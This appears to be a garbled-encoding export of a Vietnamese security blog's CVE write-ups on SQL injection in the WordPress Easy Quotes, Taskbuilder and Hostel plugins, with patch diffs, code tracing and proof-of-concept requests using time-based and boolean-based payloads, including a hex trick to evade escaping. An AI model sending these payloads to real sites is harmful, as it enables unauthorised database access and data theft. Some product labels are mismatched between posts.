wordpress nÃªn kÃ­ tá»± Ä‘áº§u tiÃªn lÃ  w {: .prompt-info }\nResponse tráº£ vá» dá»¯ liá»‡u bÃ¬nh thÆ°á»ng =\u0026gt; kÃ­ tá»± Ä‘áº§u tiÃªn lÃ  w\nKhi Ä‘Ã³, cÃ¢u query thá»±c thi sáº½ trá»Ÿ thÃ nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+SUBSTRING(DATABASE(),1,1)=\u0026#39;w\u0026#39;\u0026#34; Conclusion Lá»— há»•ng CVE-2025-26943 trong plugin WordPress Easy Quotes trÆ°á»›c phiÃªn báº£n 1.2.3 xuáº¥t phÃ¡t tá»« viá»‡c khÃ´ng sá»­ dá»¥ng cÆ¡ cháº¿ chuáº©n bá»‹ truy váº¥n ($wpdb-\u0026gt;prepare) mÃ  truyá»n trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u lá»‡nh SQL dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\nBáº£n vÃ¡ chÃ­nh thá»©c Ä‘Ã£ thay tháº¿ viá»‡c ná»‘i chuá»—i báº±ng cÃ¡ch dÃ¹ng $wpdb-\u0026gt;prepare, giÃºp Ä‘áº£m báº£o dá»¯ liá»‡u Ä‘áº§u vÃ o Ä‘Æ°á»£c kiá»ƒm soÃ¡t vÃ  an toÃ n hÆ¡n.\nKey takeaways:\nLuÃ´n sá»­ dá»¥ng $wpdb-\u0026gt;prepare() khi lÃ m viá»‡c vá»›i database trong WordPress Ä‘á»ƒ trÃ¡nh SQL Injection. ThÆ°á»ng xuyÃªn cáº­p nháº­t plugin vÃ  kiá»ƒm tra báº£o máº­t Ä‘á»ƒ trÃ¡nh trá»Ÿ thÃ nh má»¥c tiÃªu táº¥n cÃ´ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Easy Quotes Plugin \u0026lt;= 1.2.2 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-23-cve-2025-26943/","summary":"\u003cp\u003eLá»— há»•ng xáº£y ra trÃªn plugin \u003cstrong\u003eEasy Quotes\u003c/strong\u003e cá»§a WordPress trÆ°á»›c phiÃªn báº£n \u003cstrong\u003e1.2.3\u003c/strong\u003e. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-26943\"\u003eCVE-2025-26943\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/easy-quotes/#description\"\u003eWordPress Easy Quotes Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.2.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (9.3)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v1.2.2(vul) vÃ  v1.2.3(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eá»¨ng dá»¥ng Ä‘Ã£ Ä‘Æ°a trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u query SQL mÃ  \u003cstrong\u003ekhÃ´ng sá»­ dá»¥ng cÃ¡c biá»‡n phÃ¡p báº£o vá»‡\u003c/strong\u003e khiáº¿n lá»— há»•ng SQL Injection xáº£y ra.\u003c/p\u003e","title":"CVE-2025-26943"},{"content":"Lá»— há»•ng xáº£y ra trÃªn plugin Taskbuilder cá»§a WordPress trÆ°á»›c phiÃªn báº£n 4.0.2. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\nCVE ID: CVE-2025-39569 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 4.0.2 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Taskbuilder Plugin: v4.0.1(vul) vÃ  v4.0.2(fix) diff tool: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version Analysis á»¨ng dá»¥ng Ä‘Ã£ xá»­ lÃ½ dá»¯ liá»‡u Ä‘áº§u vÃ o trÆ°á»›c khi Ä‘Æ°a vÃ o cÃ¢u SQL. Tuy nhiÃªn, trong quÃ¡ trÃ¬nh xÃ¢y dá»±ng truy váº¥n, giÃ¡ trá»‹ nÃ y Ä‘Æ°á»£c chÃ¨n trá»±c tiáº¿p mÃ  khÃ´ng Ä‘Æ°á»£c bao trong dáº¥u nhÃ¡y Ä‘Æ¡n '...'. Äiá»u Ä‘Ã³ khiáº¿n káº» táº¥n cÃ´ng cÃ³ thá»ƒ chÃ¨n thÃªm cÃ¡c thÃ nh pháº§n cÃº phÃ¡p SQL há»£p lá»‡ (nhÆ° OR, AND,...) vÃ o truy váº¥n, dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\nPatch Diff DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡. CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file includes/admin/projects/get_users.php\nTrong phiÃªn báº£n v4.0.1, biáº¿n $proj_id sau khi escape Ä‘Æ°á»£c Ä‘Æ°a tháº³ng vÃ o cÃ¢u truy váº¥n mÃ  khÃ´ng cÃ³ dáº¥u nhÃ¡y Ä‘Æ¡n bao quanh:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = $proj_id\u0026#34; ); á» báº£n v4.0.2, truy váº¥n Ä‘Ã£ Ä‘Æ°á»£c Ä‘iá»u chá»‰nh báº±ng cÃ¡ch Ä‘áº·t $proj_id trong dáº¥u nhÃ¡y Ä‘Æ¡n sau khi escape:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = \u0026#39;$proj_id\u0026#39;\u0026#34; ); Báº£n vÃ¡ nÃ y Ä‘áº£m báº£o ráº±ng giÃ¡ trá»‹ $proj_id sau khi escape Ä‘Æ°á»£c coi lÃ  má»™t chuá»—i literal, khÃ´ng thá»ƒ thoÃ¡t ra khá»i dáº¥u nhÃ¡y Ä‘Æ¡n Ä‘á»ƒ chÃ¨n thÃªm cÃº phÃ¡p SQL, qua Ä‘Ã³ ngÄƒn cháº·n táº¥n cÃ´ng SQL Injection.\nHow it work? File architecture:\nCáº¥u trÃºc chung cá»§a file hiá»‡n táº¡i\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project WHERE id = $proj_id\u0026#34;); // Báº¯t Ä‘áº§u buffer Ä‘á»ƒ táº¡o ná»™i dung chÃ­nh (body) cá»§a modal ob_start(); // ... render HTML danh sÃ¡ch users $body = ob_get_clean(); // Báº¯t Ä‘áº§u buffer Ä‘á»ƒ táº¡o pháº§n footer cá»§a modal ob_start(); // ... render HTML cÃ¡c nÃºt thao tÃ¡c (Close, Save) $footer = ob_get_clean(); // Tráº£ dá»¯ liá»‡u JSON Ä‘á»ƒ frontend hiá»ƒn thá»‹ modal echo json_encode([ \u0026#39;body\u0026#39; =\u0026gt; $body, \u0026#39;footer\u0026#39; =\u0026gt; $footer, ]); $proj_id / $project: Láº¥y dá»¯ liá»‡u project tá»« database. ob_start() / ob_get_clean(): Ghi HTML ra buffer thay vÃ¬ xuáº¥t trá»±c tiáº¿p, giÃºp gom ná»™i dung vÃ o biáº¿n. $body / $footer: Chá»©a ná»™i dung HTML Ä‘á»™ng cá»§a modal. json_encode(): Tráº£ JSON cho client, cÃ³ kháº£ nÄƒng Ä‘Æ°á»£c sá»­ dá»¥ng trong Ajax Ä‘á»ƒ hiá»ƒn thá»‹ modal mÃ  khÃ´ng cáº§n refresh trang. File náº±m trong thÆ° má»¥c includes cho tháº¥y ráº±ng nÃ³ sáº½ Ä‘Æ°á»£c gá»i á»Ÿ 1 chá»©c nÄƒng nÃ o Ä‘Ã³ á»Ÿ nÆ¡i khÃ¡c. Äá»ƒ biáº¿t chá»©c nÄƒng nÃ o sá»­ dá»¥ng nÃ³, ta tÃ¬m kiáº¿m vá»›i tá»« khÃ³a get_users.php trong thÆ° má»¥c chá»©a plugin.\nğŸ‘‰ NÃ³ Ä‘Æ°á»£c include trong hÃ m wppm_get_users() cá»§a class WPPM_Admin trong file class-wppm-admin.php. wppm_get_users() lÃ  callback cá»§a action hook trong WordPress.\nWPPM_Admin construct:\nfinal class WPPM_Admin { // constructor public function __construct() { // other action add_action( \u0026#39;wp_ajax_wppm_get_users\u0026#39;,array($this,\u0026#39;wppm_get_users\u0026#39;)); // array($this,\u0026#39;wppm_get_users\u0026#39;)) = $this::wppm_get_users() // other action } } add_action() lÃ  má»™t Plugin API cá»§a WordPress, cho phÃ©p gáº¯n má»™t callback vÃ o má»™t action hook. wp_ajax_wppm_get_users lÃ  tÃªn hook Ajax, vá»›i quy táº¯c Ä‘áº·t tÃªn: wp_ajax_{action} =\u0026gt; Xá»­ lÃ½ Ajax khi user Ä‘Ã£ Ä‘Äƒng nháº­p. wp_ajax_nopriv_{action} =\u0026gt; Xá»­ lÃ½ Ajax khi user chÆ°a Ä‘Äƒng nháº­p. á» Ä‘Ã¢y, action = wppm_get_users. NghÄ©a lÃ  náº¿u trong Ajax request báº¡n gá»­i action=wppm_get_users tá»›i admin-ajax.php, thÃ¬ WordPress sáº½ tÃ¬m callback tÆ°Æ¡ng á»©ng Ä‘á»ƒ xá»­ lÃ½, á»Ÿ Ä‘Ã¢y lÃ  wppm_get_users(). ğŸ‘‰ Ta Ä‘Ã£ biáº¿t Ä‘Æ°á»£c action = wppm_get_users, kiá»ƒm tra xem Ajax nÃ o sá»­ dá»¥ng action nÃ y báº±ng cÃ¡ch tÃ¬m tá»« khÃ³a wppm_get_users trÃªn cÃ¡c file .js trong thÆ° má»¥c chá»©a plugin.\nAction wppm_get_users lÃ  pháº§n data trong request POST cá»§a hÃ m wppm_get_users()\nHÃ m wppm_get_users() sáº½ Ä‘Æ°á»£c Ä‘áº·t trong HTML attribute cá»§a chá»©c nÄƒng project\nTáº¡o project má»›i Truy cáº­p vÃ o project Ä‘Ã³ Inspect code vÃ  tÃ¬m hÃ m wppm_get_users sáº½ Ä‘Æ°á»£c Ä‘áº·t á»Ÿ Ä‘Ã¢u, hÃ nh Ä‘á»™ng nÃ o sáº½ gá»i nÃ³ ğŸ‘‰ Khi click vÃ o icon bÃªn cáº¡nh Users ajax sáº½ hoáº¡t Ä‘á»™ng, gá»­i request Ä‘áº¿n server, láº¥y danh sÃ¡ch cÃ¡c user tham gia project vÃ  mÃ£ HTML hiá»ƒn thá»‹ nÃ³.\nExploit Detect SQLi Báº¯t request báº±ng BurpSuite, gá»­i request vá»›i SQLi payload time base\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+SLEEP(1)) Thá»i gian pháº£n há»“i bá»‹ delay =\u0026gt; SQL Injection thÃ nh cÃ´ng.\nGet First Letter of Database Name Äiá»u kiá»‡n tiÃªn quyáº¿t Ä‘á»ƒ dump Ä‘Æ°á»£c háº¿t data lÃ  pháº£i dump Ä‘Æ°á»£c 1 kÃ½ tá»± báº¥t ká»³ cá»§a tÃªn database, náº¿u láº¥y Ä‘Æ°á»£c thÃ¬ toÃ n bá»™ data Ä‘á»u dump Ä‘Æ°á»£c.\nGá»­i request vá»›i SQLi payload boolean base vÃ³i proj_id Ä‘Ãºng:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name Ä‘Æ°á»£c tÃ´i Ä‘áº·t tÃªn lÃ  wordpress nÃªn kÃ­ tá»± Ä‘áº§u tiÃªn lÃ  w tÆ°Æ¡ng á»©ng vá»›i mÃ£ HEX lÃ  0x77\nSá»­ dá»¥ng SUBSTRING(STRING,1,1) Ä‘á»ƒ láº¥y kÃ­ tá»± Ä‘áº§u tiÃªn cá»§a chuá»—i\ná» Ä‘Ã¢y, $proj_id báº±ng 4 vÃ¬ SUBSTRING('wordpress',1,1)=0x77 lÃ  Ä‘Ãºng nÃªn SELECT láº¥y giÃ¡ trá»‹ Ä‘Ãºng trong IF(condition, value if true, value if false), 4 lÃ  giÃ¡ trá»‹ cÃ³ thá»±c trong database, nÃªn response tráº£ vá» chá»©a danh sÃ¡ch ngÆ°á»i tham gia dá»± Ã¡n\nSá»­ dá»¥ng HEX technique Ä‘á»ƒ bypass hÃ m esc_sql() á»Ÿ trÃªn, dÃ¹ng Ä‘á»ƒ so sÃ¡nh khi khÃ´ng sá»­ dÃ¹ng Ä‘Æ°á»£c '\nGá»­i request vá»›i SQLi payload boolean base vÃ³i proj_id sai:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) Vá»›i proj_id khÃ´ng cÃ³ thá»±c trong database, response sáº½ tráº£ vá» káº¿t quáº£ chá»©a None\nğŸ‘‰ Ta Ä‘Ã£ láº¥y Ä‘Æ°á»£c kÃ­ tá»± Ä‘áº§u tiÃªn cá»§a database name báº±ng ká»¹ thuáº­t boolean base\nproj_id Ä‘Ã¹ng: response khÃ´ng chá»©a None proj_id sai: response chá»©a None CÃ³ thá»ƒ sá»­ dá»¥ng ká»¹ thuáº­t time base nhÆ°ng khi dump sá»‘ lÆ°á»£ng lá»›n data, thá»i gian dump sáº½ ráº¥t lÃ¢u\nConclusion Lá»— há»•ng CVE-2025-39569 trong plugin WordPress Taskbuilder xuáº¥t phÃ¡t tá»« viá»‡c thiáº¿u dáº¥u nhÃ¡y Ä‘Æ¡n '...' bao quanh dá»¯ liá»‡u Ä‘áº§u vÃ o trong cÃ¢u lá»‡nh SQL, khiáº¿n dá»¯ liá»‡u ngÆ°á»i dÃ¹ng cÃ³ thá»ƒ Ä‘Æ°á»£c diá»…n giáº£i nhÆ° má»™t pháº§n cá»§a cÃ¢u lá»‡nh SQL há»£p lá»‡.\nBáº£n vÃ¡ á»Ÿ phiÃªn báº£n 4.0.2 Ä‘Ã£ kháº¯c phá»¥c váº¥n Ä‘á» báº±ng cÃ¡ch Ä‘Æ°a $proj_id vÃ o trong '...', Ä‘áº£m báº£o nÃ³ luÃ´n Ä‘Æ°á»£c xá»­ lÃ½ nhÆ° má»™t literal string trong SQL.\nKey takeaways:\nÆ¯u tiÃªn sá»­ dá»¥ng prepared statements ($wpdb-\u0026gt;prepare() trong WordPress) thay vÃ¬ tá»± chÃ¨n dá»¯ liá»‡u vÃ o query. Äá»‘i vá»›i cÃ¡c plugin WordPress, cáº§n test ká»¹ lÆ°á»¡ng cÃ¡c Ajax endpoint vÃ¬ Ä‘Ã¢y lÃ  nÆ¡i dá»… xuáº¥t hiá»‡n SQLi vÃ  XSS nháº¥t. NgÆ°á»i quáº£n trá»‹ cáº§n thÆ°á»ng xuyÃªn cáº­p nháº­t plugin/theme Ä‘á»ƒ nháº­n báº£n vÃ¡ ká»‹p thá»i. References SQL Injection cheat sheet - PortSwigger\nWordPress Taskbuilder project mnagement tool Plugin \u0026lt;= 4.0.1 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-22-cve-2025-39569/","summary":"\u003cp\u003eLá»— há»•ng xáº£y ra trÃªn plugin \u003cstrong\u003eTaskbuilder\u003c/strong\u003e cá»§a WordPress trÆ°á»›c phiÃªn báº£n \u003cstrong\u003e4.0.2\u003c/strong\u003e. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39569\"\u003eCVE-2025-39569\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/taskbuilder/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 4.0.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v4.0.1(vul) vÃ  v4.0.2(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eá»¨ng dá»¥ng Ä‘Ã£ \u003cstrong\u003exá»­ lÃ½ dá»¯ liá»‡u Ä‘áº§u vÃ o\u003c/strong\u003e trÆ°á»›c khi Ä‘Æ°a vÃ o cÃ¢u SQL. Tuy nhiÃªn, trong quÃ¡ trÃ¬nh xÃ¢y dá»±ng truy váº¥n, giÃ¡ trá»‹ nÃ y Ä‘Æ°á»£c chÃ¨n trá»±c tiáº¿p mÃ  khÃ´ng Ä‘Æ°á»£c bao trong dáº¥u nhÃ¡y Ä‘Æ¡n \u003ccode\u003e'...'\u003c/code\u003e. Äiá»u Ä‘Ã³ khiáº¿n káº» táº¥n cÃ´ng cÃ³ thá»ƒ chÃ¨n thÃªm cÃ¡c thÃ nh pháº§n cÃº phÃ¡p SQL há»£p lá»‡ (nhÆ° \u003ccode\u003eOR\u003c/code\u003e, \u003ccode\u003eAND\u003c/code\u003e,\u003ccode\u003e...\u003c/code\u003e) vÃ o truy váº¥n, dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\u003c/p\u003e","title":"CVE-2025-39569 Analysis \u0026 POC"},{"content":"Lá»— há»•ng trong plugin Hostel trÆ°á»›c phiÃªn báº£n 1.1.5.7. Do viá»‡c lÃ m sáº¡ch dá»¯ liá»‡u khÃ´ng Ä‘Ãºng cÃ¡ch, Ä‘iá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) vÃ  v1.1.5.7(fix) diff tool: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ thÃ¡y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version Analysis NguyÃªn nhÃ¢n cá»‘ lÃµi do á»©ng dá»¥ng chÃ¨n trá»±c tiáº¿p dá»¯ liá»‡u tá»« GET request vÃ o SQL query mÃ  cÆ¡ cháº¿ kiá»ƒm soÃ¡t khÃ´ng cháº·t cháº½.\nPatch Diff DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡. CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file controllers/bookings.php\nBáº£n lá»— há»•ng:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } Báº£n vÃ¡:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } ğŸ‘‰ Báº£n vÃ¡ sá»­ dá»¥ng whitelist Ä‘á»ƒ giá»›i háº¡n cÃ¡c cá»™t cÃ³ thá»ƒ Ä‘Æ°á»£c sáº¯p xáº¿p, náº¿u khÃ´ng há»£p lá»‡ tráº£ vá» 'tB.id'.\nAnalysis: Lá»— há»•ng xuáº¥t hiá»‡n khi param ob Ä‘Æ°á»£c truyá»n trá»±c tiáº¿p vÃ o má»‡nh Ä‘á» ORDER BY thÃ´ng qua hÃ m sanitize_text_field(), chá»‰ escape mÃ  khÃ´ng filter SQLi.\nHow it work? Äá»ƒ inject Ä‘Æ°á»£c, ta cáº§n pháº£i xÃ¡c Ä‘á»‹nh toÃ n bá»™ cÃ¢u query Ä‘Æ°á»£c Ä‘Æ°á»£c sá»­ dá»¥ng á»Ÿ Ä‘Ã¢y\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); CÃ¢u query náº±m trong nhÃ¡nh default cá»§a cáº¥u trÃºc switch.\nToÃ n bá»™ Ä‘oáº¡n xá»­ lÃ½ naá»³ thuá»™c vá» hÃ m static manage() cá»§a class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao tiáº¿p vá»›i core thÃ´ng qua Plugin API (Hook System). Do Ä‘Ã³, Ä‘á»ƒ xÃ¡c Ä‘á»‹nh nÆ¡i hÃ m manage() Ä‘Æ°á»£c gá»i, ta cÃ³ thá»ƒ tÃ¬m kiáº¿m tá»« khÃ³a \u0026quot;manage\u0026quot; trong thÆ° má»¥c chá»©a plugin.\nTrong file models/hostel.php ta cÃ³ hÃ m:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } á» Ä‘Ã¢y:\nadd_menu_page() táº¡o menu chÃ­nh trong Admin Dashboard. add_submenu_page() thÃªm cÃ¡c submenu con cho menu Ä‘Ã³. Tham sá»‘ $callback lÃ  má»™t callback function sáº½ Ä‘Æ°á»£c gá»i khi ngÆ°á»i dÃ¹ng click vÃ o menu/submenu. VÃ­ dá»¥:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); 